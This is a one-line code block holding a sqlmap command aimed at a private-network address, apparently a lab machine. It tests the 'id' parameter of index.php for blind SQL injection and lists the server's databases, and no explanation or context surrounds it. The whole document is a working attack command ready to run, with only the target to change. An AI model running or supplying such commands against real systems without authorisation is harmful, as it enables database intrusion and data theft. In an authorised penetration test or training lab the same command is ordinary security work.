

```
sqlmap -u "http://172.16.120.137/index.php?id=1" \
  --level=2 \
  --risk=1 \
  --batch \
  --technique=BT \
  --dbs \
  --delay=1
  
